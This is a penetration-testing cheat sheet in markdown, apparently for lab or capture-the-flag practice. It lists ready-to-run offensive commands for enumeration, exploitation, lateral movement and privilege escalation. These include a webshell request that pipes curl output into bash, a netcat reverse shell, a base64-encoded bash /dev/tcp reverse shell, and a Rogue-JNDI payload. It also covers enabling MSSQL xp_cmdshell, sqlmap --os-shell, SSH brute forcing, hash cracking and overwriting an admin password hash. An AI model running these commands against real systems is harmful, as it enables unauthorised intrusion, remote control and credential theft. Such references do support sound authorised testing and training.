# Penetration Testing

Overview
---------
1. - [Enumeration](#1---enumeration)
2. - [Exploitation](#2---exploitation)
3. - [Lateral Movement](#3---lateral-movement)
4. - [Privilege Escalation](#4---privilege-escalation)
5. - [Miscellaneous](#5---Miscellaneous)
6. - [Online Resources](#6---online-resources)
7. - [Browser Plugins](#7---browser-plugins)
     
#1. - Enumeration
-----------------------------------------

- Nmap

```
$ nmap -sC -sV -p- -Pn -A <IP address>
$ nmap -sC -sV -p- -Pn -A -sU <IP address>
$ nmap --top-ports=100 <IP address>
$ nmap <IP address> --script vuln
```

- FTP (port 21)

```
$ ftp <IP address> (anonymous:anonymous)
ftp> dir
ftp> get <file>
ftp> put <file>
```

- Telnet (port 23)

```
$ telnet <IP address>
```

- TFTP (udp/port 69)

```
$ tftp <IP address>
tftp> get <file>
tftp> put <file>
```

- Gobuster (port 80)

```
$ gobuster dir -w <wordlist> -u <URL>
$ gobuster dir -w <wordlist> -u <URL> -x php,html
$ gobuster vhost -w <wordlist> -u <URL>
```

- Smbclient (port 445)

```
$ smbclient -L <IP address>
$ smbclient -L <IP address> -U <username>
$ smbclient \\\\<IP address>\\c$
$ smbclient \\\\<IP address>\\c$ -U <username>
```

- Rsync (port 873)

```
$ rsync --list-only <IP address>::
$ rsync --list-only <IP address>::<share>
$ rsync <IP address>::<share>/<filename> <filename>
```

- MSSQL (port 1433)

```
$ python3 mssqlclient.py <domain>/<username>@<IP address> -windows-auth
SQL> SELECT is_srvrolemember('sysadmin');
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE; sp_configure; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell "whoami";
```

- MySQL (port 3306)

```
$ mysql -h <IP address> -u root
MariaDB [(none)]> SHOW databases;
MariaDB [(none)]> USE <database name>;
MariaDB [(none)]> SHOW tables;
MariaDB [(none)]> SELECT * FROM <table name>;
```

- Xfreerdp (port 3389)

```
$ xfreerdp /v:<IP address>
$ xfreerdp /v:<IP address> /u:Administrator
$ freerdp /v:<IP address> /cert:ignore /u:Administrator
```

- PostgreSQL (port 5432)

```
$ psql -h <IP address> -U <username> -p <password>
<username>=# \l
<username>=# \c secrets
<username>=# \dt
<username>=# SELECT * FROM <table>;
```

- Redis-cli (port 6379)

```
$ redis-cli -h <IP address>
<IP address>:6379> select <db number e.g. 0>
<IP address>:6379> keys *
<IP address>:6379> get <key>
```

- MongoDB (port 27017/27117)

```
$ ./mongo mongodb://<IP address>:27017
> show dbs;
> use <db name>;
> show collections;
> db.<collection>.find().pretty();
$ mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
$ mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("<Object ID>")},{$set:{"x_shadow":"<SHA-512 hash>"}})'
```

#2. - Exploitation
-----------------------------------------

- Local File Inclusion (LFI)

```
http://<domain name>/<page>?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

- Remote File Inclusion (RFI)

```
sudo responder -I <network interface>
http://<domain name>/<page>?page=//<IP address>/somefile
```

- Server Side Template Injection (SSTI)

```
${7*7}
```

- Webshell

```
http://<domain name>/shell.php?cmd=id
http://<domain name>/shell.php?cmd=curl%20<IP address>:8000/shell.sh|bash
```

- John The Ripper

```
$ john -w=/usr/share/wordlists/rockyou.txt hash.txt
$ john --show hashes.txt
```

- HashID

```
$ hashid <hash>
```

- Netcat

```
$ nc -nlvp <port>
$ nc -nv <IP address> <port> -e cmd.exe
```

- Tcpdump

```
$ sudo tcpdump -i <interface> port <port>
```

- Host Files

```
$ python3 -m http.server 8000
```

- Hydra

```
$ hydra -L <usernames.txt> -p '<password>' <IP address> ssh
```

- Escape Restricted Shell

```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'; CTRL+Z; stty raw -echo; fg; export TERM=XTERM
$ script /dev/null -c bash
```

- Zip2john

```
$ zip2john <ZIP file> > hashes.txt
```

- Hashcat

```
$ hashcat -a 0 -m 0 hashes.txt <wordlist>
```

- Sqlmap

```
$ sqlmap -u '<URL>' --cookie="PHPSESSID=<PHPSESSID>"
$ sqlmap -u '<URL>' --cookie="PHPSESSID=<PHPSESSID>" --os-shell
```

- Rogue-JNDI

```
$ java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,<base64 payload>} | {base64,-d}|{bash,-i}" --hostname "<IP address>"
```

#3. - Lateral Movement
-----------------------------------------

- Evil-winrm

```
$ evil-winrm -i <IP address> -u <username> -p <password>
```

- Local Port Forwarding

```
$ ssh -L 1234:localhost:5432 <username>@<remote IP address>
```

- Dynamic Port Forwarding

```
$ ssh -D 1234 <username>@<remote IP address>
```

- Proxychains

```
Edit /etc/proxychains4.conf
$ proxychains <command>
```

- PsExec

```
$ python psexec.py <username>:<password>@<IP address>
$ python psexec.py <username>@<IP address>
```

#4. - Privilege Escalation
-----------------------------------------

- WinPEAS

```
C:\> .\winPEASx64.exe
```

- LinPEAS

```
$ .\linpeas.sh
```

- Find passwords

```
$ cat * | grep -i passw*
```

- Sudo

```
$ sudo -l
```

- Add /tmp directory to the PATH environmental variable 

```
$ export PATH=/tmp:$PATH
```

#5. - Miscellaneous
-----------------------------------------

- Connect to OpenVPN

```
$ sudo openvpn <filename>.ovpn
```

- Clone a GitHub repository

```
$ git clone <URL.git>
```

- Enable a browser to resolve a hostname to a IP address

```
Edit /etc/hosts
```

- Check for local listening ports

```
$ ss -tulpn
```

- List running processes

```
$ ps aux
```

- Configure your browser to send traffic through a proxy

```
Preferences -> Network Settings -> Manual Proxy Configuration
```

- Find a file

```
$ find / -name <string> 2>/dev/null
```

- Encode a payload in base64

```
$ echo 'bash -c bash -i >&/dev/tcp/<IP address>/<port> 0>&1' | base64
```

- Create a SHA-512 hash

```
$ mkpasswd -m sha-512 Password1234
```

- Set permissions on a id_rsa file

```
$ chmod 400 id_rsa
$ ssh -i id_rsa <username>@<IP address>
```

- Check permissions on a file

```
$ icacls <file>
```

- Read a file printing only human-readable strings

```
$ strings <file>
```

#6. - Online Resources
-----------------------------------------

- Speedguide

```
https://www.speedguide.net/port.php?port=3389
```

- CrackStation

```
https://crackstation.net/
```

#7. - Browser Plugins
-----------------------------------------

- Wappalyzer: Website technology analyser

```
https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/
```

- Cookie Editor: edit cookies

```
https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/
```

- FoxyProxy: proxy management

```
https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
```
